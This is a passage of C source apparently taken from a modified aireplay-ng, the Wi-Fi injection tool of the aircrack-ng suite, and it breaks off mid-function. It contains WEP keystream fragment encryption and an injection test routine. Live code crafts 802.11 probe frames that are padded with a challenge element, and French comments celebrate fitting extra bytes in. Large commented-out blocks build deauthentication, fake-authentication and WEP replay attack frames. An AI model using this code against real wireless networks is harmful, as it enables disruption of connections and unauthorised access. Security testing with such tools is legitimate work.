        if(fragsize <= packet_len-(header_size+t-fragsize))
            pack_size = header_size + 4 + fragsize;
        else
            pack_size = header_size + 4 + (packet_len-(header_size+t-fragsize));

    //Add ICV
        add_icv(frag, pack_size, header_size + 4);
        pack_size += 4;

    //Encrypt
        xor_keystream(frag + header_size + 4, keystream, fragsize+4);

    //Send
        send_packet(frag, pack_size);
        if (t<data_size)usleep(100);

        if (t>=data_size) break;
    }

}

int grab_essid(unsigned char* packet, int len)
{
    int i=0, j=0, pos=0, tagtype=0, taglen=0, chan=0;
    unsigned char bssid[6];

    memcpy(bssid, packet+16, 6);
    taglen = 22;    //initial value to get the fixed tags parsing started
    taglen+= 12;    //skip fixed tags in frames
    do
    {
        pos    += taglen + 2;
        tagtype = packet[pos];
        taglen  = packet[pos+1];
    } while(tagtype != 3 && pos < len-2);

    if(tagtype != 3) return -1;
    if(taglen != 1) return -1;
    if(pos+2+taglen > len) return -1;

    chan = packet[pos+2];

    pos=0;

    taglen = 22;    //initial value to get the fixed tags parsing started
    taglen+= 12;    //skip fixed tags in frames
    do
    {
        pos    += taglen + 2;
        tagtype = packet[pos];
        taglen  = packet[pos+1];
    } while(tagtype != 0 && pos < len-2);

    if(tagtype != 0) return -1;
    if(taglen > 250) taglen = 250;
    if(pos+2+taglen > len) return -1;

    for(i=0; i<20; i++)
    {
        if( ap[i].set)
        {
            if( memcmp(bssid, ap[i].bssid, 6) == 0 )    //got it already
            {
                if(packet[0] == 0x50 && !ap[i].found)
                {
                    ap[i].found++;
                }
                if(ap[i].chan == 0) ap[i].chan=chan;
                break;
            }
        }
        if(ap[i].set == 0)
        {
            for(j=0; j<taglen; j++)
            {
                if(packet[pos+2+j] < 32 || packet[pos+2+j] > 127)
                {
                    return -1;
                }
            }

            ap[i].set = 1;
            ap[i].len = taglen;
            memcpy(ap[i].essid, packet+pos+2, taglen);
            ap[i].essid[taglen] = '\0';
            memcpy(ap[i].bssid, bssid, 6);
            ap[i].chan = chan;
            if(packet[0] == 0x50) ap[i].found++;
            return 0;
        }
    }
    return -1;
}

static int get_ip_port(char *iface, char *ip, const int ip_size)
{
	char *host;
	char *ptr;
	int port = -1;
	struct in_addr addr;

	host = strdup(iface);
	if (!host)
		return -1;

	ptr = strchr(host, ':');
	if (!ptr)
		goto out;

	*ptr++ = 0;

	if (!inet_aton(host, (struct in_addr *)&addr))
		goto out; /* XXX resolve hostname */

	if(strlen(host) > 15)
        {
            port = -1;
            goto out;
        }
	strncpy(ip, host, ip_size);
	port = atoi(ptr);
        if(port <= 0) port = -1;

out:
	free(host);
	return port;
}

void dump_packet(unsigned char* packet, int len)
{
    int i=0;

    for(i=0; i<len; i++)
    {
        if(i>0 && i%4 == 0)printf(" ");
        if(i>0 && i%16 == 0)printf("\n");
        printf("%02X ", packet[i]);
    }
    printf("\n\n");
}

struct net_hdr {
	uint8_t		nh_type;
	uint32_t	nh_len;
	uint8_t		nh_data[0];
} __packed;

int tcp_test(const char* ip_str, const short port)
{
    int sock, i;
    struct sockaddr_in s_in;
    int packetsize = 1024;
    unsigned char packet[packetsize];
    struct timeval tv, tv2, tv3;
    int caplen = 0;
    int times[REQUESTS];
    int min, avg, max, len;
    struct net_hdr nh;

    tv3.tv_sec=0;
    tv3.tv_usec=1;

    s_in.sin_family = PF_INET;
    s_in.sin_port = htons(port);
    if (!inet_aton(ip_str, &s_in.sin_addr))
            return -1;

    if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
            return -1;

    /* avoid blocking on reading the socket */
    if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )
    {
        perror( "fcntl(O_NONBLOCK) failed" );
        return( 1 );
    }

    gettimeofday( &tv, NULL );

    while (1)  //waiting for relayed packet
    {
        if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)
        {
            if(errno != EINPROGRESS && errno != EALREADY)
            {
                perror("connect");
                close(sock);

                printf("Failed to connect\n");

                return -1;
            }
        }
        else
        {
            gettimeofday( &tv2, NULL );
            break;
        }

        gettimeofday( &tv2, NULL );
        //wait 3000ms for a successful connect
        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3000*1000))
        {
            printf("Connection timed out\n");
            close(sock);
            return(-1);
        }
        usleep(10);
    }

    PCT; printf("TCP connection successful\n");

    //trying to identify airserv-ng
    memset(&nh, 0, sizeof(nh));
//     command: GET_CHAN
    nh.nh_type	= 2;
    nh.nh_len	= htonl(0);

    if (send(sock, &nh, sizeof(nh), 0) != sizeof(nh))
    {
        perror("send");
        return -1;
    }

    gettimeofday( &tv, NULL );
    i=0;

    while (1)  //waiting for GET_CHAN answer
    {
        caplen = read(sock, &nh, sizeof(nh));

        if(caplen == -1)
        {
            if( errno != EAGAIN )
            {
                perror("read");
                return -1;
            }
        }

        if(caplen > 0 && (unsigned)caplen == sizeof(nh))
        {
            len = ntohl(nh.nh_len);
            if (len <= packetsize && len > 0)
            {
                if( nh.nh_type == 1 && i==0 )
                {
                    i=1;
                    caplen = read(sock, packet, len);
                    if(caplen == len)
                    {
                        i=2;
                        break;
                    }
                    else
                    {
                        i=0;
                    }
                }
                else
                {
                    caplen = read(sock, packet, len);
                }
            }
        }

        gettimeofday( &tv2, NULL );
        //wait 1000ms for an answer
        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))
        {
            break;
        }
        if(caplen == -1)
            usleep(10);
    }

    if(i==2)
    {
        PCT; printf("airserv-ng found\n");
    }
    else
    {
        PCT; printf("airserv-ng NOT found\n");
    }

    close(sock);

    for(i=0; i<REQUESTS; i++)
    {
        if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
                return -1;

        /* avoid blocking on reading the socket */
        if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )
        {
            perror( "fcntl(O_NONBLOCK) failed" );
            return( 1 );
        }

        usleep(1000);

        gettimeofday( &tv, NULL );

        while (1)  //waiting for relayed packet
        {
            if (connect(sock, (struct sockaddr*) &s_in, sizeof(s_in)) == -1)
            {
                if(errno != EINPROGRESS && errno != EALREADY)
                {
                    perror("connect");
                    close(sock);

                    printf("Failed to connect\n");

                    return -1;
                }
            }
            else
            {
                gettimeofday( &tv2, NULL );
                break;
            }

            gettimeofday( &tv2, NULL );
            //wait 1000ms for a successful connect
            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (1000*1000))
            {
                break;
            }
            //simple "high-precision" usleep
            select(1, NULL, NULL, NULL, &tv3);
        }
        times[i] = ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec));
        printf( "\r%d/%d\r", i, REQUESTS);
        fflush(stdout);
        close(sock);
    }

    min = INT_MAX;
    avg = 0;
    max = 0;

    for(i=0; i<REQUESTS; i++)
    {
        if(times[i] < min) min = times[i];
        if(times[i] > max) max = times[i];
        avg += times[i];
    }
    avg /= REQUESTS;

    PCT; printf("ping %s:%d (min/avg/max): %.3fms/%.3fms/%.3fms\n", ip_str, port, min/1000.0, avg/1000.0, max/1000.0);

    return 0;
}

int do_attack_test()
{
    unsigned char packet[4096];
    struct timeval tv, tv2, tv3;
    int len=0, i=0, j=0, k=0;
    int gotit=0, answers=0, found=0;
    int caplen=0, essidlen=0;
    unsigned int min, avg, max;
    int ret=0;
    float avg2;
    struct rx_info ri;
    int atime=200;  //time in ms to wait for answer packet (needs to be higher for airserv)
    unsigned char nulldata[1024];

    if(opt.port_out > 0)
    {
        atime += 200;
        PCT; printf("Testing connection to injection device %s\n", opt.iface_out);
        ret = tcp_test(opt.ip_out, opt.port_out);
        if(ret != 0)
        {
            return( 1 );
        }
        printf("\n");

        /* open the replay interface */
        _wi_out = wi_open(opt.iface_out);
        if (!_wi_out)
            return 1;
        printf("\n");
        dev.fd_out = wi_fd(_wi_out);
        wi_get_mac(_wi_out, dev.mac_out);
        if(opt.s_face == NULL)
        {
            _wi_in = _wi_out;
            dev.fd_in = dev.fd_out;

            /* XXX */
            dev.arptype_in = dev.arptype_out;
            wi_get_mac(_wi_in, dev.mac_in);
        }
    }

    if(opt.s_face && opt.port_in > 0)
    {
        atime += 200;
        PCT; printf("Testing connection to capture device %s\n", opt.s_face);
        ret = tcp_test(opt.ip_in, opt.port_in);
        if(ret != 0)
        {
            return( 1 );
        }
        printf("\n");

        /* open the packet source */
        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
        wi_get_mac(_wi_in, dev.mac_in);
        printf("\n");
    }
    else if(opt.s_face && opt.port_in <= 0)
    {
        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
        wi_get_mac(_wi_in, dev.mac_in);
        printf("\n");
    }

    if(opt.port_in <= 0)
    {
        /* avoid blocking on reading the socket */
        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
        {
            perror( "fcntl(O_NONBLOCK) failed" );
            return( 1 );
        }
    }

    if(getnet(NULL, 0, 0) != 0)
        return 1;

    srand( time( NULL ) );

    memset(ap, '\0', 20*sizeof(struct APt));

    essidlen = strlen(opt.r_essid);
    if( essidlen > 250) essidlen = 250;

    if( essidlen > 0 )
    {
        ap[0].set = 1;
        ap[0].found = 0;
        ap[0].len = essidlen;
        memcpy(ap[0].essid, opt.r_essid, essidlen);
        ap[0].essid[essidlen] = '\0';
        memcpy(ap[0].bssid, opt.r_bssid, 6);
        found++;
    }

    if(opt.bittest)
        set_bitrate(_wi_out, RATE_1M);

    PCT; printf("Trying broadcast probe requests...\n");

    memcpy(h80211, PROBE_REQ, 24);

    len = 24;

    h80211[24] = 0x00;      //ESSID Tag Number
    h80211[25] = 0x00;      //ESSID Tag Length

    len += 2;

    //memcpy(h80211+len, RATES, 16);

    //len += 16;
    //memcpy(h80211+len, RATES, 16);

    //len += 16;
    //memcpy(h80211+len, RATES, 16);

    //len += 16;

    gotit=0;
    answers=0;

    //memcpy(h80211, NULL_DATA, sizeof(NULL_DATA) - 1);
    //len = sizeof(NULL_DATA) - 1;

    // Avec TYPE_DATA, on peut recevoir 4 octets. (a partir de data[24])
    //h80211[0] = IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_CFPOLL;

    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ASSOC_REQ;
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ASSOC_RESP;
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_REASSOC_REQ;

    char* str =
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789"
        "0123456789";

    memcpy(h80211+4, str, 6*3); // MAC ADDRESS * 3

    h80211[len++] = IEEE80211_ELEMID_CHALLENGE;
    memcpy(h80211+len, str, IEEE80211_CHALLENGE_LEN);
    len += 128;

    // FUCK YEAH on commence a avoir qqc.
    // mac address * 3 -> 18 bytes
    // +
    // on peut caller 85 bytes de CHALLENGE
    // -> 18+85 = 103 !!!!

    //memcpy(h80211+len, str, sizeof(str));
    //memcpy(h80211+len, str, sizeof(str));
    len += sizeof(str);


    send_packet(h80211, len);
    send_packet(h80211, len);
    send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_REASSOC_RESP;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_PROBE_REQ;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_PROBE_RESP;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_BEACON;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ATIM;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_DISASSOC;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_AUTH;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_DEAUTH;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);

    //h80211[0] = IEEE80211_FC0_TYPE_CTL | IEEE80211_FC0_SUBTYPE_PS_POLL;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_CTL | IEEE80211_FC0_SUBTYPE_RTS;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_CTL | IEEE80211_FC0_SUBTYPE_CTS;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_CTL | IEEE80211_FC0_SUBTYPE_ACK;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_CTL | IEEE80211_FC0_SUBTYPE_CF_END;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //h80211[0] = IEEE80211_FC0_TYPE_CTL | IEEE80211_FC0_SUBTYPE_CF_END_ACK;
    //send_packet(h80211, len);
    //send_packet(h80211, len);
    //send_packet(h80211, len);



    
//    for(i=0; i<3; i++)
//    {
//        /*
//            random source so we can identify our packets
//        */
//        opt.r_smac[0] = 0x00;
//        opt.r_smac[1] = rand() & 0xFF;
//        opt.r_smac[2] = rand() & 0xFF;
//        opt.r_smac[3] = rand() & 0xFF;
//        opt.r_smac[4] = rand() & 0xFF;
//        opt.r_smac[5] = rand() & 0xFF;
//
//        memcpy(h80211+10, opt.r_smac, 6);
//
//        send_packet(h80211, len);
//
//        gettimeofday( &tv, NULL );
//
//        while (1)  //waiting for relayed packet
//        {
//            caplen = read_packet(packet, sizeof(packet), &ri);
//
//            if (packet[0] == 0x50 ) //Is probe response
//            {
//                if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
//                {
//                    if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
//                    {
//                        found++;
//                    }
//                    if(!answers)
//                    {
//                        PCT; printf("Injection is working!\n");
//                        if(opt.fast) return 0;
//                        gotit=1;
//                        answers++;
//                    }
//                }
//            }
//
//            if (packet[0] == 0x80 ) //Is beacon frame
//            {
//                if(grab_essid(packet, caplen) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
//                {
//                    found++;
//                }
//            }
//
//            gettimeofday( &tv2, NULL );
//            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*atime*1000)) //wait 'atime'ms for an answer
//            {
//                break;
//            }
//        }
//    }
//    if(answers == 0)
//    {
//        PCT; printf("No Answer...\n");
//    }
//
//    PCT; printf("Found %d AP%c\n", found, ((found == 1) ? ' ' : 's' ) );
//
//    if(found > 0)
//    {
//        printf("\n");
//        PCT; printf("Trying directed probe requests...\n");
//    }
//
//    for(i=0; i<found; i++)
//    {
//        if(wi_get_channel(_wi_out) != ap[i].chan)
//        {
//            wi_set_channel(_wi_out, ap[i].chan);
//        }
//
//        if(wi_get_channel(_wi_in) != ap[i].chan)
//        {
//            wi_set_channel(_wi_in, ap[i].chan);
//        }
//
//        PCT; printf("%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \'%s\'\n", ap[i].bssid[0], ap[i].bssid[1],
//                    ap[i].bssid[2], ap[i].bssid[3], ap[i].bssid[4], ap[i].bssid[5], ap[i].chan, ap[i].essid);
//
//        ap[i].found=0;
//        min = INT_MAX;
//        max = 0;
//        avg = 0;
//        avg2 = 0;
//
//        memcpy(h80211, PROBE_REQ, 24);
//
//        len = 24;
//
//        h80211[24] = 0x00;      //ESSID Tag Number
//        h80211[25] = ap[i].len; //ESSID Tag Length
//        memcpy(h80211+len+2, ap[i].essid, ap[i].len);
//
//        len += ap[i].len+2;
//
//        memcpy(h80211+len, RATES, 16);
//
//        len += 16;
//
//        for(j=0; j<REQUESTS; j++)
//        {
//            /*
//                random source so we can identify our packets
//            */
//            opt.r_smac[0] = 0x00;
//            opt.r_smac[1] = rand() & 0xFF;
//            opt.r_smac[2] = rand() & 0xFF;
//            opt.r_smac[3] = rand() & 0xFF;
//            opt.r_smac[4] = rand() & 0xFF;
//            opt.r_smac[5] = rand() & 0xFF;
//
//            //build/send probe request
//            memcpy(h80211+10, opt.r_smac, 6);
//
//            send_packet(h80211, len);
//            usleep(10);
//
//            //build/send request-to-send
//            memcpy(nulldata, RTS, 16);
//            memcpy(nulldata+4, ap[i].bssid, 6);
//            memcpy(nulldata+10, opt.r_smac, 6);
//
//            send_packet(nulldata, 16);
//            usleep(10);
//
//            //build/send null data packet
//            memcpy(nulldata, NULL_DATA, 24);
//            memcpy(nulldata+4, ap[i].bssid, 6);
//            memcpy(nulldata+10, opt.r_smac, 6);
//            memcpy(nulldata+16, ap[i].bssid, 6);
//
//            send_packet(nulldata, 24);
//            usleep(10);
//
//            //build/send auth request packet
//            memcpy(nulldata, AUTH_REQ, 30);
//            memcpy(nulldata+4, ap[i].bssid, 6);
//            memcpy(nulldata+10, opt.r_smac, 6);
//            memcpy(nulldata+16, ap[i].bssid, 6);
//
//            send_packet(nulldata, 30);
//
//            //continue
//            gettimeofday( &tv, NULL );
//
//            printf( "\r%2d/%2d: %3d%%\r", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));
//            fflush(stdout);
//            while (1)  //waiting for relayed packet
//            {
//                caplen = read_packet(packet, sizeof(packet), &ri);
//
//                if (packet[0] == 0x50 ) //Is probe response
//                {
//                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
//                    {
//                        if(! memcmp(ap[i].bssid, packet+16, 6)) //From the mentioned AP
//                        {
//                            gettimeofday( &tv3, NULL);
//                            ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
//                            if(!answers)
//                            {
//                                if(opt.fast)
//                                {
//                                    PCT; printf("Injection is working!\n\n");
//                                    return 0;
//                                }
//                                answers++;
//                            }
//                            ap[i].found++;
//                            if((signed)ri.ri_power > -200)
//                                ap[i].pwr[j] = (signed)ri.ri_power;
//                            break;
//                        }
//                    }
//                }
//
//                if (packet[0] == 0xC4 ) //Is clear-to-send
//                {
//                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
//                    {
//                        gettimeofday( &tv3, NULL);
//                        ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
//                        if(!answers)
//                        {
//                            if(opt.fast)
//                            {
//                                PCT; printf("Injection is working!\n\n");
//                                return 0;
//                            }
//                            answers++;
//                        }
//                        ap[i].found++;
//                        if((signed)ri.ri_power > -200)
//                            ap[i].pwr[j] = (signed)ri.ri_power;
//                        break;
//                    }
//                }
//
//                if (packet[0] == 0xD4 ) //Is ack
//                {
//                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
//                    {
//                        gettimeofday( &tv3, NULL);
//                        ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
//                        if(!answers)
//                        {
//                            if(opt.fast)
//                            {
//                                PCT; printf("Injection is working!\n\n");
//                                return 0;
//                            }
//                            answers++;
//                        }
//                        ap[i].found++;
//                        if((signed)ri.ri_power > -200)
//                            ap[i].pwr[j] = (signed)ri.ri_power;
//                        break;
//                    }
//                }
//
//                if (packet[0] == 0xB0 ) //Is auth response
//                {
//                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
//                    {
//                        if (! memcmp(packet+10, packet+16, 6)) //From BSS ID
//                        {
//                            gettimeofday( &tv3, NULL);
//                            ap[i].ping[j] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
//                            if(!answers)
//                            {
//                                if(opt.fast)
//                                {
//                                    PCT; printf("Injection is working!\n\n");
//                                    return 0;
//                                }
//                                answers++;
//                            }
//                            ap[i].found++;
//                            if((signed)ri.ri_power > -200)
//                                ap[i].pwr[j] = (signed)ri.ri_power;
//                            break;
//                        }
//                    }
//                }
//
//                gettimeofday( &tv2, NULL );
//                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (atime*1000)) //wait 'atime'ms for an answer
//                {
//                    break;
//                }
//                usleep(10);
//            }
//            printf( "\r%2d/%2d: %3d%%\r", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));
//            fflush(stdout);
//        }
//        for(j=0; j<REQUESTS; j++)
//        {
//            if(ap[i].ping[j] > 0)
//            {
//                if(ap[i].ping[j] > max) max = ap[i].ping[j];
//                if(ap[i].ping[j] < min) min = ap[i].ping[j];
//                avg += ap[i].ping[j];
//                avg2 += ap[i].pwr[j];
//            }
//        }
//        if(ap[i].found > 0)
//        {
//            avg /= ap[i].found;
//            avg2 /= ap[i].found;
//            PCT; printf("Ping (min/avg/max): %.3fms/%.3fms/%.3fms Power: %.2f\n", (min/1000.0), (avg/1000.0), (max/1000.0), avg2);
//        }
//        PCT; printf("%2d/%2d: %3d%%\n\n", ap[i].found, REQUESTS, ((ap[i].found*100)/REQUESTS));
//
//        if(!gotit && answers)
//        {
//            PCT; printf("Injection is working!\n\n");
//            gotit=1;
//        }
//    }
//
//    if(opt.bittest)
//    {
//        if(found > 0)
//        {
//            PCT; printf("Trying directed probe requests for all bitrates...\n");
//        }
//
//        for(i=0; i<found; i++)
//        {
//            if(ap[i].found <= 0)
//                continue;
//            printf("\n");
//            PCT; printf("%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \'%s\'\n", ap[i].bssid[0], ap[i].bssid[1],
//                        ap[i].bssid[2], ap[i].bssid[3], ap[i].bssid[4], ap[i].bssid[5], ap[i].chan, ap[i].essid);
//
//            min = INT_MAX;
//            max = 0;
//            avg = 0;
//
//            memcpy(h80211, PROBE_REQ, 24);
//
//            len = 24;
//
//            h80211[24] = 0x00;      //ESSID Tag Number
//            h80211[25] = ap[i].len; //ESSID Tag Length
//            memcpy(h80211+len+2, ap[i].essid, ap[i].len);
//
//            len += ap[i].len+2;
//
//            memcpy(h80211+len, RATES, 16);
//
//            len += 16;
//
//            for(k=0; k<RATE_NUM; k++)
//            {
//                ap[i].found=0;
//                if(set_bitrate(_wi_out, bitrates[k]))
//                    continue;
//
//
//                avg2 = 0;
//                memset(ap[i].pwr, 0, REQUESTS*sizeof(unsigned int));
//
//                for(j=0; j<REQUESTS; j++)
//                {
//                    /*
//                        random source so we can identify our packets
//                    */
//                    opt.r_smac[0] = 0x00;
//                    opt.r_smac[1] = rand() & 0xFF;
//                    opt.r_smac[2] = rand() & 0xFF;
//                    opt.r_smac[3] = rand() & 0xFF;
//                    opt.r_smac[4] = rand() & 0xFF;
//                    opt.r_smac[5] = rand() & 0xFF;
//
//                    memcpy(h80211+10, opt.r_smac, 6);
//
//                    send_packet(h80211, len);
//
//                    gettimeofday( &tv, NULL );
//
//                    printf( "\r%2d/%2d: %3d%%\r", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));
//                    fflush(stdout);
//                    while (1)  //waiting for relayed packet
//                    {
//                        caplen = read_packet(packet, sizeof(packet), &ri);
//
//                        if (packet[0] == 0x50 ) //Is probe response
//                        {
//                            if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
//                            {
//                                if(! memcmp(ap[i].bssid, packet+16, 6)) //From the mentioned AP
//                                {
//                                    if(!answers)
//                                    {
//                                        answers++;
//                                    }
//                                    ap[i].found++;
//                                    if((signed)ri.ri_power > -200)
//                                        ap[i].pwr[j] = (signed)ri.ri_power;
//                                    break;
//                                }
//                            }
//                        }
//
//                        gettimeofday( &tv2, NULL );
//                        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (100*1000)) //wait 300ms for an answer
//                        {
//                            break;
//                        }
//                        usleep(10);
//                    }
//                    printf( "\r%2d/%2d: %3d%%\r", ap[i].found, j+1, ((ap[i].found*100)/(j+1)));
//                    fflush(stdout);
//                }
//                for(j=0; j<REQUESTS; j++)
//                    avg2 += ap[i].pwr[j];
//                if(ap[i].found > 0)
//                    avg2 /= ap[i].found;
//                PCT; printf("Probing at %2.1f Mbps:\t%2d/%2d: %3d%%\n", wi_get_rate(_wi_out)/1000000.0,
//                            ap[i].found, REQUESTS, ((ap[i].found*100)/REQUESTS));
//            }
//
//            if(!gotit && answers)
//            {
//                PCT; printf("Injection is working!\n\n");
//                if(opt.fast) return 0;
//                gotit=1;
//            }
//        }
//    }
//    if(opt.bittest)
//        set_bitrate(_wi_out, RATE_1M);
//
//    if( opt.s_face != NULL )
//    {
//        printf("\n");
//        PCT; printf("Trying card-to-card injection...\n");
//
//        /* sync both cards to the same channel, or the test will fail */
//        if(wi_get_channel(_wi_out) != wi_get_channel(_wi_in))
//        {
//            wi_set_channel(_wi_out, wi_get_channel(_wi_in));
//        }
//
//        /* Attacks */
//        for(i=0; i<5; i++)
//        {
//            k=0;
//            /* random macs */
//            opt.f_smac[0] = 0x00;
//            opt.f_smac[1] = rand() & 0xFF;
//            opt.f_smac[2] = rand() & 0xFF;
//            opt.f_smac[3] = rand() & 0xFF;
//            opt.f_smac[4] = rand() & 0xFF;
//            opt.f_smac[5] = rand() & 0xFF;
//
//            opt.f_dmac[0] = 0x00;
//            opt.f_dmac[1] = rand() & 0xFF;
//            opt.f_dmac[2] = rand() & 0xFF;
//            opt.f_dmac[3] = rand() & 0xFF;
//            opt.f_dmac[4] = rand() & 0xFF;
//            opt.f_dmac[5] = rand() & 0xFF;
//
//            opt.f_bssid[0] = 0x00;
//            opt.f_bssid[1] = rand() & 0xFF;
//            opt.f_bssid[2] = rand() & 0xFF;
//            opt.f_bssid[3] = rand() & 0xFF;
//            opt.f_bssid[4] = rand() & 0xFF;
//            opt.f_bssid[5] = rand() & 0xFF;
//
//            if(i==0) //attack -0
//            {
//                memcpy( h80211, DEAUTH_REQ, 26 );
//                memcpy( h80211 + 16, opt.f_bssid, 6 );
//                memcpy( h80211 +  4, opt.f_dmac,  6 );
//                memcpy( h80211 + 10, opt.f_smac, 6 );
//
//                opt.f_iswep = 0;
//                opt.f_tods = 0; opt.f_fromds = 0;
//                opt.f_minlen = opt.f_maxlen = 26;
//            }
//            else if(i==1) //attack -1 (open)
//            {
//                memcpy( h80211, AUTH_REQ, 30 );
//                memcpy( h80211 +  4, opt.f_dmac, 6 );
//                memcpy( h80211 + 10, opt.f_smac , 6 );
//                memcpy( h80211 + 16, opt.f_bssid, 6 );
//
//                opt.f_iswep = 0;
//                opt.f_tods = 0; opt.f_fromds = 0;
//                opt.f_minlen = opt.f_maxlen = 30;
//            }
//            else if(i==2) //attack -1 (psk)
//            {
//                memcpy( h80211, ska_auth3, 24);
//                memcpy( h80211 +  4, opt.f_dmac, 6);
//                memcpy( h80211 + 10, opt.f_smac,  6);
//                memcpy( h80211 + 16, opt.f_bssid, 6);
//
//                //iv+idx
//                h80211[24] = 0x86;
//                h80211[25] = 0xD8;
//                h80211[26] = 0x2E;
//                h80211[27] = 0x00;
//
//                //random bytes (as encrypted data)
//                for(j=0; j<132; j++)
//                    h80211[28+j] = rand() & 0xFF;
//
//                opt.f_iswep = 1;
//                opt.f_tods = 0; opt.f_fromds = 0;
//                opt.f_minlen = opt.f_maxlen = 24+4+132;
//            }
//            else if(i==3) //attack -3
//            {
//                memcpy( h80211, NULL_DATA, 24);
//                memcpy( h80211 +  4, opt.f_bssid, 6);
//                memcpy( h80211 + 10, opt.f_smac,  6);
//                memcpy( h80211 + 16, opt.f_dmac, 6);
//
//                //iv+idx
//                h80211[24] = 0x86;
//                h80211[25] = 0xD8;
//                h80211[26] = 0x2E;
//                h80211[27] = 0x00;
//
//                //random bytes (as encrypted data)
//                for(j=0; j<132; j++)
//                    h80211[28+j] = rand() & 0xFF;
//
//                opt.f_iswep = -1;
//                opt.f_tods = 1; opt.f_fromds = 0;
//                opt.f_minlen = opt.f_maxlen = 24+4+132;
//            }
//            else if(i==4) //attack -5
//            {
//                memcpy( h80211, NULL_DATA, 24);
//                memcpy( h80211 +  4, opt.f_bssid, 6);
//                memcpy( h80211 + 10, opt.f_smac,  6);
//                memcpy( h80211 + 16, opt.f_dmac, 6);
//
//                h80211[1] |= 0x04;
//                h80211[22] = 0x0A;
//                h80211[23] = 0x00;
//
//                //iv+idx
//                h80211[24] = 0x86;
//                h80211[25] = 0xD8;
//                h80211[26] = 0x2E;
//                h80211[27] = 0x00;
//
